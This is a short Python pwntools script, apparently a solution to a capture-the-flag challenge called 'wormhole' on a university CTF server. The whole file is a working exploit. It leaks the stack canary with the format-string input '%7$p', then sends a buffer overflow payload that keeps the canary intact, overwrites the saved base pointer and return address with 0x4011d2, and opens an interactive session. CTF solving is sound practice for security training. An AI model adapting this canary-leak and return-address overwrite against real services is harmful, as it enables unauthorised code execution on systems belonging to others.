from pwn import *

if args.REMOTE:
    host = "challs.umasscybersec.org"
    port = 1337
    p = remote(host, port)
else:
    e = ELF("./static/wormhole")
    context.terminal = ["tmux","splitw","-h"]
    p = process(e.path)

print(p.recvuntil(b"?"))
p.sendline(b"%7$p\n") # canary leak
canary = int(p.recvuntil(b"C").strip()[:-1], 16)
print('canary', hex(canary))
p.clean()
payload = b"A"*8 # buf
payload += p64(canary) # canary
payload += b"B"*8 # rbp
payload += p64(0x4011d2) # ret
payload += b'\0'

p.sendline(payload)

p.interactive()